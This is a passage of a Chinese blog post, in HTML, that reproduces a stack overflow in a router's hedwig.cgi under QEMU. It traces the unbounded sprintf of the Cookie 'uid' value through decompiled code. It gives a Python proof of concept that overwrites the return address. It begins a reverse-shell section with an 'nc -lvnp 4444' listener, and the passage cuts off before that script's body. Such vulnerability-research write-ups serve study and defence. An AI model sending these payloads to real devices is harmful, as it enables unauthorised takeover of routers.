Control</span><br><span class="line">        &#123;</span><br><span class="line">            Alias /</span><br><span class="line">            Location /htdocs/web</span><br><span class="line">            IndexNames &#123; index.php index.html &#125;</span><br><span class="line"></span><br><span class="line">            External</span><br><span class="line">            &#123;</span><br><span class="line">                /usr/sbin/phpcgi &#123; php &#125;</span><br><span class="line">                /usr/sbin/phpcgi &#123; router_info.xml &#125;</span><br><span class="line">                /usr/sbin/phpcgi &#123; post_login.xml &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            Specials</span><br><span class="line">            &#123;</span><br><span class="line">                CGI &#123; cgi &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Control</span><br><span class="line">        &#123;</span><br><span class="line">            Alias /HNAP1</span><br><span class="line">            Location /htdocs/HNAP1</span><br><span class="line"></span><br><span class="line">            External</span><br><span class="line">            &#123;</span><br><span class="line">                /usr/sbin/hnap &#123; hnap &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            IndexNames &#123; index.hnap &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>然后使用 <code>sudo chmod 750 init</code>修改 init 的权限为 750 。</p>
+<p>传入一个 静态编译的 gdbserver 到 mnt 目录下。<br>下载链接：<a class="link"   target="_blank" rel="noopener" href="https://github.com/guyush1/gdb-static/releases" >Releases · guyush1&#x2F;gdb-static<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<p>最后，解除挂载： <code>sudo umont mnt</code> 。</p>
+<h3 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h3><p>创建 run.sh，内容如下</p>
+<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">qemu-system-mipsel \</span><br><span class="line">  -M malta \</span><br><span class="line">  -kernel vmlinux \</span><br><span class="line">  -drive file=rootfs.ext2,format=raw,<span class="keyword">if</span>=ide \</span><br><span class="line">  -append <span class="string">&quot;root=/dev/sda rw rootfstype=ext2 console=ttyS0 init=/init&quot;</span> \</span><br><span class="line">  -netdev user,<span class="built_in">id</span>=n0,hostfwd=tcp::6666-:80,hostfwd=tcp::1234-:1234 \</span><br><span class="line">  -device pcnet,netdev=n0 \</span><br><span class="line">  -nographic</span><br></pre></td></tr></table></figure></div>
+
+<p>转发了 80、1234 两个端口为本地的 6666 和 1234。<br>前者用于访问 web 服务，后者用于远程调试，可以访问 <code>http://127.0.0.1:6666/hedwig.cgi</code> 看看效果。</p>
+<h2 id="漏洞程序分析"><a href="#漏洞程序分析" class="headerlink" title="漏洞程序分析"></a>漏洞程序分析</h2><p><code>/htdocs/web/hedwig.cgi</code> ，但是是软链接到 <code>/htdocs/cgibin</code></p>
+<h3 id="hedwigcgi-main"><a href="#hedwigcgi-main" class="headerlink" title="hedwigcgi_main"></a>hedwigcgi_main</h3><p>使用 ida 打开</p>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v3, <span class="string">&quot;hedwig.cgi&quot;</span>) )</span><br><span class="line">&#123;</span><br><span class="line">    v8 = &amp;hedwigcgi_main;</span><br><span class="line">    v9 = argc;</span><br><span class="line">    <span class="keyword">return</span> v8(v9, argv, envp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>查看 hedwigcgi_main，注意到</p>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="type">char</span> v27[<span class="number">1024</span>]; <span class="comment">// [sp+C0h] [-400h] BYREF</span></span><br><span class="line">...</span><br><span class="line">v20 = sobj_get_string(v4);</span><br><span class="line"><span class="built_in">sprintf</span>(v27, <span class="string">&quot;/htdocs/webinc/fatlady.php\nprefix=%s/%s&quot;</span>, <span class="string">&quot;/runtime/session&quot;</span>, v20);</span><br><span class="line">xmldbc_ephp(<span class="number">0</span>, <span class="number">0</span>, v27, <span class="built_in">stdout</span>);</span><br><span class="line">...</span><br></pre></td></tr></table></figure></div>
+<p>sprintf 存在溢出的可能，%s 并未限定长度，v27 数组大小才 1024，如果 v20 长度足够就能溢出，向上追溯 v20。</p>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *__fastcall <span class="title function_">sobj_get_string</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// $v1</span></span><br><span class="line"></span><br><span class="line">  v1 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = *(a1 + <span class="number">20</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !v1 )</span><br><span class="line">      <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p>看起来 v20，只是 v4 指向结构体的指针字段，继续追溯 v4</p>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">v4 = sobj_new();</span><br><span class="line">v5 = sobj_new();</span><br><span class="line">v3 = v5;</span><br><span class="line"><span class="keyword">if</span> ( !v4 || !v5 )</span><br><span class="line">&#123;</span><br><span class="line">res = <span class="string">&quot;unable to allocate string object&quot;</span>;</span><br><span class="line"><span class="keyword">goto</span> LABEL_34;</span><br><span class="line">&#125;</span><br><span class="line">sess_get_uid(v4);</span><br></pre></td></tr></table></figure></div>
+<p>v4 的内容在 sess_get_uid 中被修改。</p>
+<h3 id="sess-get-uid"><a href="#sess-get-uid" class="headerlink" title="sess_get_uid"></a>sess_get_uid</h3><p>简单修改后，内容大致如下</p>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">sess_get_uid</span><span class="params">(sobj *ptr)</span></span><br><span class="line">&#123;</span><br><span class="line">  sobj *key_obj; <span class="comment">// $s2</span></span><br><span class="line">  <span class="type">char</span> *HTTP_COOKIE; <span class="comment">// $v0</span></span><br><span class="line">  sobj *val_obj; <span class="comment">// $s3</span></span><br><span class="line">  <span class="type">char</span> *HTTP_COOKIE_ptr; <span class="comment">// $s4</span></span><br><span class="line">  <span class="type">int</span> flag; <span class="comment">// $s1</span></span><br><span class="line">  <span class="type">int</span> val; <span class="comment">// $s0</span></span><br><span class="line">  <span class="type">char</span> *<span class="built_in">string</span>; <span class="comment">// $v0</span></span><br><span class="line"></span><br><span class="line">  key_obj = sobj_new();</span><br><span class="line">  val_obj = sobj_new();</span><br><span class="line">  HTTP_COOKIE = getenv(<span class="string">&quot;HTTP_COOKIE&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !key_obj )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_27;</span><br><span class="line">  <span class="keyword">if</span> ( !val_obj )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_27;</span><br><span class="line">  HTTP_COOKIE_ptr = HTTP_COOKIE;</span><br><span class="line">  <span class="keyword">if</span> ( !HTTP_COOKIE )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_27;</span><br><span class="line">  flag = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    val = *HTTP_COOKIE_ptr;</span><br><span class="line">    <span class="keyword">if</span> ( !*HTTP_COOKIE_ptr )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( flag == <span class="number">1</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_11;</span><br><span class="line">    <span class="keyword">if</span> ( flag &lt; <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( val == <span class="string">&#x27; &#x27;</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_18;</span><br><span class="line">      sobj_free(key_obj);</span><br><span class="line">      sobj_free(val_obj);</span><br><span class="line">LABEL_11:</span><br><span class="line">      <span class="keyword">if</span> ( val == <span class="string">&#x27;;&#x27;</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        flag = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        flag = <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span> ( val != <span class="string">&#x27;=&#x27;</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          sobj_add_char(key_obj, val);</span><br><span class="line">          flag = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_18;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( flag == <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( val == <span class="string">&#x27;;&#x27;</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        flag = <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_18;</span><br><span class="line">      &#125;</span><br><span class="line">      sobj_add_char(val_obj, *HTTP_COOKIE_ptr++);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      flag = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> ( !sobj_strcmp(key_obj, <span class="string">&quot;uid&quot;</span>) )</span><br><span class="line">        <span class="keyword">goto</span> end;</span><br><span class="line">LABEL_18:</span><br><span class="line">      ++HTTP_COOKIE_ptr;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !sobj_strcmp(key_obj, <span class="string">&quot;uid&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">end:</span><br><span class="line">    <span class="built_in">string</span> = sobj_get_string(val_obj);</span><br><span class="line">    <span class="keyword">goto</span> LABEL_22;</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_27:</span><br><span class="line">  <span class="built_in">string</span> = getenv(<span class="string">&quot;REMOTE_ADDR&quot;</span>);</span><br><span class="line">LABEL_22:</span><br><span class="line">  sobj_add_string(ptr, <span class="built_in">string</span>);</span><br><span class="line">  <span class="keyword">if</span> ( key_obj )</span><br><span class="line">    sobj_del(key_obj);</span><br><span class="line">  <span class="keyword">if</span> ( val_obj )</span><br><span class="line">    sobj_del(val_obj);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p>总之，就是找 <strong>HTTP_COOKIE</strong> 环境变量中的形似于 <em>uid&#x3D;xxxxxxxxxxxxx</em> 的内容，然后把 &#x3D; 后面的给到 <code>ptr</code>，也就是上文的 <code>v4</code> 。</p>
+<p>容易想到利用 HTTP_COOKIE 进行栈溢出利用。</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="调试方案"><a href="#调试方案" class="headerlink" title="调试方案"></a>调试方案</h3><p>使用 run.sh 启动服务后，使用 ps 查看 httpd 进程的 pid，然后使用 gdbserver 附加</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/gdbserver 0.0.0.0:1234 --attach &lt;pid&gt;</span><br></pre></td></tr></table></figure></div>
+
+<p>然后在宿主机上使用 <code>gdb-multiarch ./hedwig.cgi</code> 调试，然后用 <code>target remote :1234</code> 连接远程。</p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>经过分析，知道是 mips 栈溢出利用，为了成功运行到 sprintf，还需要一些额外的准备</p>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">v20 = sobj_get_string(v4);</span><br><span class="line"><span class="built_in">sprintf</span>(v27, <span class="string">&quot;/htdocs/webinc/fatlady.php\nprefix=%s/%s&quot;</span>, <span class="string">&quot;/runtime/session&quot;</span>, v20);</span><br><span class="line">xmldbc_ephp(<span class="number">0</span>, <span class="number">0</span>, v27, <span class="built_in">stdout</span>);</span><br></pre></td></tr></table></figure></div>
+
+<h4 id="第一个注意点"><a href="#第一个注意点" class="headerlink" title="第一个注意点"></a>第一个注意点</h4><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">	REQUEST_METHOD = getenv(<span class="string">&quot;REQUEST_METHOD&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> ( !REQUEST_METHOD ) &#123;</span><br><span class="line">	    v1 = <span class="string">&quot;no REQUEST&quot;</span>;</span><br><span class="line">LABEL_7:</span><br><span class="line">	    obj_2 = <span class="number">0</span>;</span><br><span class="line">	    obj1 = <span class="number">0</span>;</span><br><span class="line">LABEL_34:</span><br><span class="line">	    v9 = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_25;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> ( strcasecmp(REQUEST_METHOD, <span class="string">&quot;POST&quot;</span>) ) &#123;</span><br><span class="line">    v1 = <span class="string">&quot;unsupported HTTP request&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_7;</span><br><span class="line">	&#125;</span><br><span class="line">...</span><br><span class="line">LABEL_25:</span><br><span class="line">	    <span class="built_in">printf</span>(<span class="string">&quot;HTTP/1.1 200 OK\r\nContent-Type: text/xml\r\n\r\n&lt;hedwig&gt;&lt;result&gt;FAILED&lt;/result&gt;&lt;message&gt;%s&lt;/message&gt;&lt;/hedwig&gt;&quot;</span>,</span><br><span class="line">	    v1);</span><br><span class="line">	&#125;</span><br><span class="line">LABEL_26:</span><br><span class="line">	<span class="keyword">if</span> ( haystack )</span><br><span class="line">	    <span class="built_in">free</span>(haystack);</span><br><span class="line">	<span class="keyword">if</span> ( obj_2 )</span><br><span class="line">	    sobj_del(obj_2);</span><br><span class="line">	<span class="keyword">if</span> ( obj1 )</span><br><span class="line">	    sobj_del(obj1);</span><br><span class="line">	<span class="keyword">return</span> v9;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p>必须满足是 POST 请求方法</p>
+<h4 id="第二个注意点"><a href="#第二个注意点" class="headerlink" title="第二个注意点"></a>第二个注意点</h4><p>注意到有对 haystack 变量的检测</p>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !haystack )</span><br><span class="line">&#123;</span><br><span class="line">    v1 = <span class="string">&quot;no xml data.&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_34;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>这个变量可以通过 <strong>cgibin_parse_request -&gt; sub_403B10 -&gt; sub_402FFC -&gt; sub_402B40 -&gt; sub_409A6C</strong> 的路径赋值（实际上是 <code>hedwigcgi_main</code> 中，<code>cgibin_parse_request</code> 将 <code>sub_409A6C</code> 函数指针作为参数传递，最后在 <code>sub_402B40</code> 触发 <code>sub_409A6C</code>）</p>
+<p>简单修复 cgibin_parse_request，内容如下（省去了一部分）</p>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">cgibin_parse_request</span><span class="params">(<span class="type">void</span> (*func)(), <span class="type">int</span> num, <span class="type">unsigned</span> <span class="type">int</span> a3)</span></span><br><span class="line">&#123;</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ( getenv(<span class="string">&quot;CONTENT_TYPE&quot;</span>) &amp;&amp; (CONTENT_LENGTH_STR = getenv(<span class="string">&quot;CONTENT_LENGTH&quot;</span>)) != <span class="number">0</span> )</span><br><span class="line">	    CONTENT_LENGTH = atoi(CONTENT_LENGTH_STR);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	    CONTENT_LENGTH = <span class="number">0</span>;</span><br><span class="line">	v20.k_obj = sobj_new();</span><br><span class="line">    v8 = sobj_new();</span><br><span class="line">    v20.v_obj = v8;</span><br><span class="line">	v9 = <span class="number">-1</span>;</span><br><span class="line">	<span class="keyword">if</span> ( v20.k_obj &amp;&amp; v8 ) &#123;</span><br><span class="line">	    v10 = getenv(<span class="string">&quot;REQUEST_URI&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v10 )</span><br><span class="line">    &#123;</span><br><span class="line">      v11 = <span class="built_in">strchr</span>(v10, <span class="number">63</span>);</span><br><span class="line">      v9 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v11 )</span><br><span class="line">      &#123;</span><br><span class="line">        ...</span><br><span class="line">        v9 = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v9 = <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">...</span><br><span class="line">  <span class="keyword">if</span> ( v9 != <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( a3 &gt;= CONTENT_LENGTH )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( CONTENT_LENGTH )</span><br><span class="line">      &#123;</span><br><span class="line">        getenv(<span class="string">&quot;CONTENT_TYPE&quot;</span>);</span><br><span class="line">        CONTENT_TYPE = getenv(<span class="string">&quot;CONTENT_TYPE&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> ( CONTENT_TYPE )</span><br><span class="line">        &#123;</span><br><span class="line">          func_stru = funcs;</span><br><span class="line">          idx = <span class="number">0</span>;</span><br><span class="line">          <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            path = func_stru-&gt;path;</span><br><span class="line">            <span class="keyword">if</span> ( !func_stru-&gt;path )</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            len = func_stru-&gt;len;</span><br><span class="line">            ++func_stru;</span><br><span class="line">            ++idx;</span><br><span class="line">            <span class="keyword">if</span> ( !strncasecmp(CONTENT_TYPE, path, len) )</span><br><span class="line">              <span class="keyword">return</span> (funcs[idx - <span class="number">1</span>].fun)(func, num, CONTENT_LENGTH, &amp;CONTENT_TYPE[len]);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      sub_402CE8(CONTENT_LENGTH);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-100</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v9;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p>在 <code>(funcs[idx - 1].fun)(func, num, CONTENT_LENGTH, &amp;CONTENT_TYPE[len])</code> 触发函数指针，对应的 path 是 <strong>application&#x2F;</strong></p>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_403B10</span><span class="params">(<span class="type">void</span> (*func)(), <span class="type">int</span> num, <span class="type">size_t</span> len, <span class="type">const</span> <span class="type">char</span> *str)</span> &#123;</span><br><span class="line">	<span class="keyword">if</span> ( !strncasecmp(str, <span class="string">&quot;x-www-form-urlencoded&quot;</span>, <span class="number">0x15u</span>) )</span><br><span class="line">	    <span class="keyword">return</span> sub_402FFC(func, num, len);</span><br><span class="line">	sub_402CE8(len);</span><br><span class="line">	sub_403794(<span class="string">&quot;read_ct_application&quot;</span>, str);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p>为了触发 <code>sub_402FFC(func, num, len)</code> ，需要 str 为 <strong>x-www-form-urlencoded</strong>，也就是上面的 <code>&amp;CONTENT_TYPE[len]</code> 是<strong>x-www-form-urlencoded</strong> 。</p>
+<p>综上，<em>CONTENT_TYPE</em> （对应请求的 Content-Type 字段）为 <strong>application&#x2F;x-www-form-urlencoded</strong></p>
+<h4 id="尝试调试"><a href="#尝试调试" class="headerlink" title="尝试调试"></a>尝试调试</h4><p>首先，连接上调试，加上断点，然后 <code>continue</code> 继续运行，最后使用 python 脚本发信</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1:6666/hedwig.cgi&quot;</span></span><br><span class="line">solid = <span class="string">&quot;/htdocs/webinc/fatlady.php\nprefix=/runtime/session/&quot;</span></span><br><span class="line">slen = <span class="built_in">len</span>(solid)</span><br><span class="line"></span><br><span class="line">payload = (<span class="number">1024</span>+<span class="number">9</span>*<span class="number">4</span> - slen)*<span class="string">b&quot;A&quot;</span></span><br><span class="line">payload += <span class="string">b&#x27;\x66&#x27;</span></span><br><span class="line"></span><br><span class="line">data = &#123;<span class="string">&quot;atker&quot;</span>: <span class="string">&quot;fun&quot;</span>&#125;</span><br><span class="line">header = &#123;</span><br><span class="line">    <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Cookie&quot;</span>: <span class="string">b&quot;uid=&quot;</span> + payload</span><br><span class="line">&#125;</span><br><span class="line">res = requests.post(url = url, data = data, headers = header)</span><br></pre></td></tr></table></figure></div>
+<p>就能看到程序停在断点处。</p>
+<blockquote>
+<p>注意：payload 不要写 \x00 这样的内容，会阶段，\x09 好像也会被处理成 \x20。</p>
+</blockquote>
+<h3 id="反弹-shell"><a href="#反弹-shell" class="headerlink" title="反弹 shell"></a>反弹 shell</h3><p>上面提供的脚本刚好覆盖返回地址最低位为 0x66，修改为其他内容就能实现任意地址跳转。</p>
+<p><del>mips rop 就不细讲了，无非是 gadget 凑 ROP。</del></p>
+<p>这里采用 ROP+shellcode 反弹 shell 的方法，记得另开一个终端监听 4444 端口：<code>nc -lvnp 4444</code></p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span 